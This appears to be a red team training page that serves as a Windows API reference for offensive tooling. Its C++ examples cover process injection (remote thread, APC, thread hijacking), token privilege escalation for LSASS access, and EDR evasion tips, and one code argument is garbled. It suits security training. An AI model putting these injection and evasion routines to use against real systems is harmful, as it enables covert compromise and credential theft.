---
layout: training-page
title: "Windows API Reference for Red Team — Red Team Academy"
module: "Tool Development"
tags:
  - windows-api
  - process-injection
  - c-plus-plus
  - tool-dev
  - shellcode
  - token-manipulation
  - process-memory
page_key: "tool-dev-windows-api-reference"
render_with_liquid: false
---

# Windows API Reference for Red Team

Core Windows APIs used in offensive tool development, process injection, credential access, and post-exploitation. Each API below includes its red team use case, required access rights, and a functional C++ code example.

## Process Enumeration

### CreateToolhelp32Snapshot — List Running Processes

Takes a snapshot of running processes and their modules. Used to enumerate all processes for target selection, parent process spoofing, or finding injection targets.

```
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main() {
    // Snapshot all running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 1;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::cout << "PID: " << pe32.th32ProcessID
                      << "  Parent: " << pe32.th32ParentProcessID
                      << "  Name: " << pe32.szExeFile << std::endl;
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}
// Flags: TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE | TH32CS_SNAPTHREAD
```

### GetModuleFileName — Get Executable Path by PID

Retrieves the full path of a process's executable. Useful for confirming injection targets or enumerating loaded DLLs.

```
#include <windows.h>
#include <psapi.h>
#include <iostream>

// Compile with: /link psapi.lib
int main() {
    DWORD processId = 1234; // Target PID

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                   FALSE, processId);
    if (hProcess == NULL) return 1;

    char szPath[MAX_PATH];
    if (GetModuleFileNameExA(hProcess, NULL, szPath, MAX_PATH))
        std::cout << "Path: " << szPath << std::endl;

    CloseHandle(hProcess);
    return 0;
}
```

## Process Handle Operations

### OpenProcess — Get Handle to Target Process

Opens an existing process and returns a handle. The handle's capabilities depend on the requested access rights. This is the first step for almost all process injection techniques.

```
#include <windows.h>

// Required access rights for common operations:
// PROCESS_ALL_ACCESS          — all rights (most detectable)
// PROCESS_VM_READ             — ReadProcessMemory
// PROCESS_VM_WRITE            — WriteProcessMemory
// PROCESS_VM_OPERATION        — VirtualAllocEx, VirtualProtectEx
// PROCESS_CREATE_THREAD       — CreateRemoteThread
// PROCESS_QUERY_INFORMATION   — GetTokenInformation, GetModuleFileName
// PROCESS_DUP_HANDLE          — DuplicateHandle

HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION
                               | PROCESS_CREATE_THREAD, FALSE, targetPid);
// OPSEC: PROCESS_ALL_ACCESS is loudly flagged by EDR.
// Request only the specific rights needed for the operation.
```

### DuplicateHandle — Clone Process/Thread Handle

Duplicates a handle from one process to another. Used for handle theft attacks — steal a high-privilege handle from another process without OpenProcess.

```
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hSource = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
                                  GetCurrentProcessId());

    HANDLE hDuplicate = NULL;
    if (DuplicateHandle(
            GetCurrentProcess(),    // Source process
            hSource,                // Source handle
            GetCurrentProcess(),    // Target process
            &hDuplicate,           // Output duplicate
            0,                      // Access (0 = same as source)
            FALSE,
            DUPLICATE_SAME_ACCESS)) {
        std::cout << "Duplicated handle: " << hDuplicate << std::endl;
        CloseHandle(hDuplicate);
    }

    CloseHandle(hSource);
    return 0;
}
```

## Process Memory Manipulation

### ReadProcessMemory — Read Another Process's Memory

Reads memory from a target process. Used to extract credentials from LSASS, read loaded modules, or inspect process state.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, targetPid);
    if (hProcess == NULL) return 1;

    DWORD address = 0x12345678; // Target memory address
    DWORD buffer = 0;
    SIZE_T bytesRead = 0;

    if (ReadProcessMemory(hProcess, (LPCVOID)address, &buffer,
                          sizeof(DWORD), &bytesRead))
        std::cout << "Value at " << std::hex << address
                  << ": " << std::dec << buffer << std::endl;

    CloseHandle(hProcess);
    return 0;
}
```

### WriteProcessMemory — Write to Another Process's Memory

Writes data to a target process's memory. Required for all injection techniques that plant shellcode or DLL paths in a remote process.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;

    // Need PROCESS_VM_WRITE + PROCESS_VM_OPERATION
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                                   FALSE, targetPid);
    if (hProcess == NULL) return 1;

    LPVOID targetAddress = (LPVOID)0x12345678;
    DWORD value = 42;
    SIZE_T bytesWritten = 0;

    WriteProcessMemory(hProcess, targetAddress, &value,
                       sizeof(DWORD), &bytesWritten);

    CloseHandle(hProcess);
    return 0;
}
```

### VirtualAllocEx — Allocate Memory in Remote Process

Allocates a memory region in a target process. The first step in shellcode injection — allocate RWX (or RW→RX) memory to write shellcode into.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) return 1;

    SIZE_T shellcodeSize = 4096;

    // Allocate RWX memory — detectable. Prefer RW first, then flip to RX.
    LPVOID pRemote = VirtualAllocEx(hProcess,
                                     NULL,              // Any address
                                     shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);

    if (pRemote)
        std::cout << "Allocated at: " << pRemote << std::endl;

    // Write shellcode with WriteProcessMemory, then execute
    // ...

    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
// PAGE flags: PAGE_READWRITE (0x04) → flip to PAGE_EXECUTE_READ (0x20)
// Use VirtualProtectEx to change protection after writing
```

### VirtualProtectEx — Change Memory Permissions

Changes the protection attributes of memory in a remote process. Use this to write shellcode as RW, then flip to RX — avoids allocating RWX regions which EDR flags heavily.

```
#include <windows.h>

// Stealth shellcode injection pattern (RW → RX):
// Step 1: Allocate RW (no execute)
LPVOID pMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Step 2: Write shellcode
WriteProcessMemory(hProcess, pMem, shellcode, shellcodeSize, NULL);

// Step 3: Flip to RX (remove write, add execute)
DWORD oldProtect;
VirtualProtectEx(hProcess, pMem, shellcodeSize,
                  PAGE_EXECUTE_READ, &oldProtect);

// Step 4: Execute via CreateRemoteThread / QueueUserAPC
```

## Code Injection Techniques

### CreateRemoteThread — Classic Shellcode Injection

Creates a thread in a remote process, executing at a specified address. The most classic injection technique — widely detected, but still works against unsophisticated defenses.

```
#include <windows.h>
#include <iostream>

// Full classic injection: alloc → write → execute
int InjectShellcode(DWORD targetPid, BYTE* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return 1;

    // Allocate RW memory
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) { CloseHandle(hProcess); return 1; }

    // Write shellcode
    WriteProcessMemory(hProcess, pRemote, shellcode, shellcodeSize, NULL);

    // Flip to RX
    DWORD oldProt;
    VirtualProtectEx(hProcess, pRemote, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

    // Spawn remote thread at shellcode address
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                       (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
// OPSEC: CreateRemoteThread is heavily monitored. Prefer APC injection.
```

### QueueUserAPC — APC Shellcode Injection

Queues an Asynchronous Procedure Call (APC) to execute within an alertable thread. Stealthier than CreateRemoteThread because no new thread is created — code executes in an existing thread context.

```
#include <windows.h>
#include <iostream>

// APC injection — requires an alertable thread in the target process
// Alertable threads: SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx

VOID CALLBACK APCProc(ULONG_PTR dwParam) {
    // Code runs in target thread context
}

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return 1;

    // Allocate and write shellcode (same as CreateRemoteThread pattern)
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemote, shellcode, shellcodeSize, NULL);
    DWORD oldProt;
    VirtualProtectEx(hProcess, pRemote, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

    // Get thread handle from target process (enumerate threads with CreateToolhelp32Snapshot)
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);

    // Queue APC to run at shellcode address when thread enters alertable state
    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);

    // Force thread into alertable state by suspending and resuming
    SuspendThread(hThread);
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
// See: evasion/apc-injection.html for full APC early-bird technique
```

### SetThreadContext — Thread Hijacking

Suspends a thread and redirects its instruction pointer (RIP/EIP) to shellcode. No new thread is created — executes shellcode inside an existing legitimate thread.

```
#include <windows.h>
#include <iostream>

// Thread hijacking — redirect RIP to shellcode
int HijackThread(DWORD targetTid, LPVOID shellcodeAddr) {
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    if (!hThread) return 1;

    // Suspend the target thread
    SuspendThread(hThread);

    // Get current context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // Save original RIP for cleanup, redirect to shellcode
#ifdef _WIN64
    ctx.Rip = (DWORD64)shellcodeAddr;
#else
    ctx.Eip = (DWORD)shellcodeAddr;
#endif

    // Apply modified context
    SetThreadContext(hThread, &ctx);

    // Resume — thread now executes at shellcode address
    ResumeThread(hThread);

    CloseHandle(hThread);
    return 0;
}
// OPSEC: Suspend+Resume generates events. Consider targeting sleeping threads.
```

## Token Manipulation

### OpenProcessToken — Access Process Token

Opens the access token associated with a process. Required before reading, duplicating, or modifying process privileges.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) return 1;

    HANDLE hToken = NULL;
    // TOKEN_QUERY for reading, TOKEN_ADJUST_PRIVILEGES for modification
    // TOKEN_DUPLICATE for impersonation
    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        // Use hToken for GetTokenInformation, AdjustTokenPrivileges, etc.
        CloseHandle(hToken);
    }

    CloseHandle(hProcess);
    return 0;
}
```

### GetTokenInformation — Read Token Privileges & Groups

Retrieves information from an access token — groups, privileges, integrity level, and more. Use for privilege enumeration and impersonation target selection.

```
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    // Get token groups
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)new BYTE[dwSize];
    GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize);

    for (DWORD i = 0; i < pGroups->GroupCount; i++) {
        WCHAR szName[256]; DWORD cch = 256;
        SID_NAME_USE sidType;
        if (LookupAccountSidW(NULL, pGroups->Groups[i].Sid, szName, &cch, NULL, NULL, &sidType))
            std::wcout << L"Group: " << szName << std::endl;
    }

    // Also useful: TokenPrivileges, TokenElevation, TokenIntegrityLevel
    delete[] pGroups;
    CloseHandle(hToken);
    return 0;
}
```

### AdjustTokenPrivileges — Enable SeDebugPrivilege

Enables or disables privileges in an access token. `SeDebugPrivilege` allows opening handles to any process (including SYSTEM), enabling LSASS memory access. Must hold the privilege first (admin shell).

```
#include <windows.h>
#include <iostream>

bool EnablePrivilege(LPCSTR privName) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
        CloseHandle(hToken); return false;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    bool success = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);

    CloseHandle(hToken);
    return success;
}

int main() {
    // Enable debug privilege — allows OpenProcess on LSASS
    if (EnablePrivilege(SE_DEBUG_NAME))
        std::cout << "SeDebugPrivilege enabled" << std::endl;

    // Other useful privileges:
    // SE_IMPERSONATE_NAME     — impersonate tokens
    // SE_ASSIGNPRIMARYTOKEN_NAME — assign primary token
    // SE_TCB_NAME            — act as OS (SYSTEM)
    return 0;
}
```

## DLL Loading & Execution

### GetProcAddress — Resolve API Addresses at Runtime

Retrieves the address of an exported function from a DLL. Used to dynamically resolve API calls at runtime, bypassing static import table analysis by security tools.

```
#include <windows.h>
#include <iostream>

int main() {
    // Load DLL and resolve function pointer dynamically
    HMODULE hModule = LoadLibraryA("user32.dll");
    if (!hModule) return 1;

    // Get address of MessageBoxA
    FARPROC pFunc = GetProcAddress(hModule, "MessageBoxA");
    if (pFunc) {
        // Cast and call the function
        typedef int(WINAPI* MsgBoxFn)(HWND, LPCSTR, LPCSTR, UINT);
        MsgBoxFn pMsgBox = (MsgBoxFn)pFunc;
        pMsgBox(NULL, "Resolved dynamically", "Test", MB_OK);
    }

    FreeLibrary(hModule);
    return 0;
}
// OPSEC: Resolving from PEB (GetModuleHandle) avoids LoadLibrary telemetry.
// Also useful: GetProcAddress with ordinals instead of names (evasion)
// GetProcAddress(hMod, (LPCSTR)1) — resolve by ordinal 1
```

### CreateProcessA — Spawn Process with Custom Flags

Creates a new process. Supports process creation flags for PPID spoofing, suspended state (for early-bird injection), hidden windows, and process attribute manipulation.

```
#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;   // Hide window

    PROCESS_INFORMATION pi = {0};

    // Create process suspended (for early-bird APC injection)
    CreateProcessA(
        NULL,                       // Application name
        (LPSTR)"C:\\Windows\\System32\\svchost.exe",
        NULL, NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Suspended for injection
        NULL, NULL,
        &si, π
    );

    std::cout << "PID: " << pi.dwProcessId << std::endl;

    // Inject shellcode into pi.hProcess, then ResumeThread(pi.hThread)

    // Or just resume immediately
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
// Flags: CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS
// For PPID spoofing: use UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
```

## Injection Technique Comparison

```
Technique            | New Thread | EDR Noise | Alertable Thread Required
CreateRemoteThread   | Yes        | Very High | No
QueueUserAPC         | No         | Medium    | Yes (Early-Bird: No)
SetThreadContext     | No         | Medium    | No (Thread Hijacking)
NtCreateThreadEx     | Yes        | High      | No (direct syscall version is lower)
Thread Pool Injection| No         | Low       | No (RtpWorkItemCallback)

Classic injection pipeline:
OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → Execute
```

## Compilation

```
# MSVC
cl.exe /nologo /W0 injector.cpp /link /OUT:injector.exe

# MinGW (Linux cross-compile for Windows)
x86_64-w64-mingw32-g++ -o injector.exe injector.cpp -lpsapi

# With specific libs
x86_64-w64-mingw32-g++ -o injector.exe injector.cpp -lpsapi -lwtsapi32

# Cross-compile DLL
x86_64-w64-mingw32-g++ --shared -o payload.dll payload.cpp
```

## Resources

- Windows-API-for-Red-Team — `github.com/WesleyWong420/Windows-API-for-Red-Team`
- Microsoft Win32 API docs — `learn.microsoft.com/en-us/windows/win32/api/`
- Malware Development — `github.com/cocomelonc/meow`
- Process Injection Techniques — `github.com/RedTeamOperations/Advanced-Process-Injection-Workshop`
- Sektor7 Malware Development Essentials — `institute.sektor7.net`
- VX-Underground Windows API collection — `github.com/vxunderground`
